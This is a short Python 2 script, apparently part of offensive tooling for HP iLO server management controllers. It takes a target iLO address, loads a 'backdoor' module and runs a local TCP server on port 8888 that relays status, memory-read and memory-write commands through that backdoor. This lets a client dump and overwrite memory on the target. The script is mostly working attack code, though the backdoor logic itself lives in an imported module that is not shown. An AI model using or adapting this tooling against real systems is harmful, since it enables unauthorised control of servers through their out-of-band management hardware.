#!/usr/bin/python

import socket
import sys
from struct import pack,unpack_from

from mod_backdoor import *

from dbg import *

STATUS = 0
MEM_READ = 1
MEM_WRITE = 2

mods = {"backdoor": ModBackdoor}

if len(sys.argv) != 3:
	print "usage: %s <ilo ip address> <mode>" % sys.argv[0]
	print "\tmode: %s" % ", ".join(mods.keys())
	sys.exit(1)

ilo_address = sys.argv[1]
mode = sys.argv[2]

if mode in mods:
	mod = mods[mode](ilo_address, VERBOSE)
else:
	print "Bad mode specified"
	sys.exit(1)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server_address = ('127.0.0.1', 8888)
if VERBOSE:
	print 'starting up on %s port %s' % server_address

sock.bind(server_address)
sock.listen(1)

def send_response(sock, cmd_id, addr, data):
	buf  = pack("<3Q", cmd_id, addr, len(data))
	buf += data
	sock.send(buf)

def handle(sock, data):
	cmd_id, ptr, sz = unpack_from("<3Q", data)
	if VERBOSE:
		print "[*] CMD: %x, PTR: %x, SZ: %x" % (cmd_id, ptr, sz)

	if cmd_id == STATUS:
		status = mod.status()
		send_response(sock, cmd_id, 0, chr(status))
	elif cmd_id == MEM_READ:
		try:
			output = mod.dump_memory(ptr, sz)
		except:
			output = ""
		send_response(sock, cmd_id, ptr, output)
	elif cmd_id == MEM_WRITE:
		payload = sock.recv(sz)
		mod.write_memory(ptr, payload)
		send_response(sock, cmd_id, ptr, "")


while True:
    connection, client_address = sock.accept()
    try:
        while True:
            data = connection.recv(24)
            if data:
                handle(connection,data)
            else:
                break
            
    finally:
        connection.close()